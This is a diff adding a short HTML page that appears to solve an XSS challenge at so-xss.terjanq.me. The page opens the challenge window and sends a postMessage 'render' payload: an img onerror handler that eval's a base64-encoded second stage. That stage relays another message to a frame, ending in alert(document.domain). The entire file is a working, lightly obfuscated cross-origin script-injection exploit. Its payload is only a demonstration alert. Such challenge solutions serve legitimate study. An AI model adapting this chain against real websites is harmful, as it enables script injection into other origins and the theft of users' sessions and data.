@@ -1,0 +1,10 @@
+<html>
+<script>
+// Window with headers content-security-policy: sandbox allow-scripts allow-popups allow-modals
+start = function(){
+oop = open("https://so-xss.terjanq.me/iframe.php");
+setTimeout(function(){oop.postMessage({type:"render",body:"\u003cimg src='/' onerror='eval(atob(\"c2V0VGltZW91dChmdW5jdGlvbigpe29wZW5lci5mcmFtZXNbMF0ucG9zdE1lc3NhZ2Uoe2lkZW50aWZpZXI6aWRlbnRpZmllcix0eXBlOiJyZW5kZXIiLGJvZHk6Ilx1MDAzY2ltZyBzcmM9XCJkZFwiIG9uZXJyb3I9XCJhbGVydChkb2N1bWVudC5kb21haW4pXCIvPiJ9LCIqIil9LDMwMDApOw==\"))' />"},"*");location.href="https://so-xss.terjanq.me/";},2000); }
+
+</script>
+<button onclick='start()' >start</button>
+</html>
